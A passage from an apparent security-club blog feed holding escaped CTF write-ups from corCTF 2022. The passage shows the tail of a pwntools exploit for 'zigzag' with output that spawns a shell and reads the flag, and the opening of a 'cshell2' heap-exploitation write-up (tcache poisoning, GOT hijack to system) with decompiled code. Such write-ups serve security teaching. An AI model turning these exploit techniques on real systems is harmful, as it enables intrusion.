style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))
alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x203147&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x208000&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x20351b&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x201fcf&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xa&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x208000&lt;/span&gt;))

edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0x400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(stack&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0xd0&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;))

alloc(&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;,pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x202d16&lt;/span&gt;))
edit(&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x7&lt;/span&gt;, pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;p64(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x0000000000203715&lt;/span&gt;))

io&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()

&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;nasm@off:~/Documents/pwn/corCTF/zieg$ python3 remote.py REMOTE HOST=be.ax PORT=31278
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[*] &amp;#39;/home/nasm/Documents/pwn/corCTF/zieg/zigzag&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    Arch:     amd64-64-little
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    RELRO:    No RELRO
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    Stack:    No canary found
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    NX:       NX enabled
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    PIE:      No PIE (0x200000)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[+] Opening connection to be.ax on port 31278: Done
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[*] stack: 0x7ffe21d2cc68
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[*] Loaded 37 cached gadgets for &amp;#39;zigzag&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[*] Using sigreturn for &amp;#39;SYS_execve&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[*] Switching to interactive mode
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$ id
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$ cat flag.txt
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;corctf{bl4Z1nGlY_f4sT!!}
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;- https://clubsecu-esiea.github.io/posts/zigzag/ - Beerware shit</description>
        </item>
    
    
    
        <item>
        <title>[corCTF 2022 - pwn] cshell2</title>
        <link>https://clubsecu-esiea.github.io/posts/cshell2/</link>
        <pubDate>Sun, 07 Aug 2022 00:00:00 +0000</pubDate>
        
        <guid>https://clubsecu-esiea.github.io/posts/cshell2/</guid>
        <description>ESIEA security club https://clubsecu-esiea.github.io/posts/cshell2/ -&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;cshell2&lt;/code&gt; is a heap challenge I did during the &lt;a href=&#34;https://ctftime.org/event/1656&#34;&gt;corCTF 2022&lt;/a&gt; event. It was pretty classic so I will not describe a lot.
If you begin with heap challenges, I advice you to read &lt;a href=&#34;https://ret2school.github.io/tags/heap/&#34;&gt;previous heap writeup&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;tl-dr&#34;&gt;TL; DR&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Fill tcache.&lt;/li&gt;
&lt;li&gt;Heap overflow in &lt;code&gt;edit&lt;/code&gt; on the &lt;code&gt;bio&lt;/code&gt; field which allows to leak the address of the unsortedbin.&lt;/li&gt;
&lt;li&gt;Leak heap and defeat safe-linking to get an arbitrary write through tcache poisoning.&lt;/li&gt;
&lt;li&gt;Hiijack GOT entry of &lt;code&gt;free&lt;/code&gt; to &lt;code&gt;system&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Call &lt;code&gt;free(&amp;quot;/bin/sh&amp;quot;)&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;PROFIT&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;reverse-engineering&#34;&gt;Reverse Engineering&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s take a look at the provided binary and libc:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;$ ./libc.so.6 
GNU C Library (GNU libc) development release version 2.36.9000.
Copyright (C) 2022 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 12.1.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
Minimum supported kernel: 3.2.0
For bug reporting instructions, please see:
&amp;lt;https://www.gnu.org/software/libc/bugs.html&amp;gt;.
$ checksec --file cshell2
[*] &#39;/home/nasm/Documents/pwn/corCTF/cshell2/cshell2&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fb000)
    RUNPATH:  b&#39;.&#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;A very recent libc plus a non PIE-based binary without &lt;code&gt;FULL RELRO&lt;/code&gt;. Thus we could think to some GOT hiijacking stuff directly on the binary. Let&amp;rsquo;s take a look at the &lt;code&gt;add&lt;/code&gt; function:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;()
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; idx_1; &lt;span style=&#34;color:#75715e&#34;&gt;// ebx
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt; idx; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+Fh] [rbp-21h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  size_t size; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+10h] [rbp-20h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v4; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+18h] [rbp-18h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __readfsqword(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter index: &amp;#34;&lt;/span&gt;);
  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%hhu&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;idx);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter size (1032 minimum): &amp;#34;&lt;/span&gt;);
  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lu&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;size);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( idx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEu&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x407&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; size_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx] )
  {
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Error with either index or size...&amp;#34;&lt;/span&gt;);
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
  {
    idx_1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; idx;
    chunk_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx_1] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (chunk_t &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)malloc(size);
    size_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size;
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Successfuly added!&amp;#34;&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input firstname: &amp;#34;&lt;/span&gt;);
    read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, chunk_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx], &lt;span style=&#34;color:#ae81ff&#34;&gt;8uLL&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input middlename: &amp;#34;&lt;/span&gt;);
    read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, chunk_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx]&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;midName, &lt;span style=&#34;color:#ae81ff&#34;&gt;8uLL&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input lastname: &amp;#34;&lt;/span&gt;);
    read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, chunk_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx]&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;lastName, &lt;span style=&#34;color:#ae81ff&#34;&gt;8uLL&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input age: &amp;#34;&lt;/span&gt;);
    __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%lu&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;chunk_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx]&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;age);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input bio: &amp;#34;&lt;/span&gt;);
    read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, chunk_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx]&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;bio, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x100uLL&lt;/span&gt;);
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v4 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; __readfsqword(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It creates a chunk by asking several fields but nothing actually interesting there. Let&amp;rsquo;s take a look at the &lt;code&gt;show&lt;/code&gt; function:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;show&lt;/span&gt;()
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt; v1; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+7h] [rbp-9h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v2; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+8h] [rbp-8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __readfsqword(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
  puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter index: &amp;#34;&lt;/span&gt;);
  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%hhu&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v1);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEu&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; size_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1] )
    printf(
      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Name&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; last: %s first: %s middle: %s age: %d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;bio: %s&amp;#34;&lt;/span&gt;,
      chunk_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1]&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;lastName,
      chunk_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1]&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;firstName,
      chunk_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1]&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;midName,
      chunk_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1]&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;age,
      chunk_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1]&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;bio);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Invalid index&amp;#34;&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; __readfsqword(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It prints a chunk only if it&amp;rsquo;s allocated (size entry initialized in the size array) and if the index is right.
Then the &lt;code&gt;delete&lt;/code&gt; function:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;delete&lt;/span&gt;()
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt; v1; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+7h] [rbp-9h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v2; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+8h] [rbp-8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __readfsqword(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter index: &amp;#34;&lt;/span&gt;);
  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%hhu&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v1);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEu&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; size_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1] )
  {
    free(chunk_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1]);
    size_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; v1] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;;
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Successfully Deleted!&amp;#34;&lt;/span&gt;);
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
  {
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Either index error or trying to delete something you shouldn&amp;#39;t be...&amp;#34;&lt;/span&gt;);
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; __readfsqword(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Quite common &lt;code&gt;delete&lt;/code&gt; handler, it prevents double free.
The vulnerability is in the &lt;code&gt;edit&lt;/code&gt; function:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;edit&lt;/span&gt;()
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt; idx; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+7h] [rbp-9h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v2; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+8h] [rbp-8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __readfsqword(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
  printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Enter index: &amp;#34;&lt;/span&gt;);
  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%hhu&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;idx);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( idx &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEu&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; size_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx] )
  {
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input firstname: &amp;#34;&lt;/span&gt;);
    read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, chunk_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx], &lt;span style=&#34;color:#ae81ff&#34;&gt;8uLL&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input middlename: &amp;#34;&lt;/span&gt;);
    read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, chunk_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx]&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;midName, &lt;span style=&#34;color:#ae81ff&#34;&gt;8uLL&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input lastname: &amp;#34;&lt;/span&gt;);
    read(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, chunk_array[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; idx]&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;lastName, &lt;span style=&#34;color:#ae81ff&#34;&gt;8uLL&lt;/span&gt;);
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Input age: &amp;#34;&lt;/span&gt;);
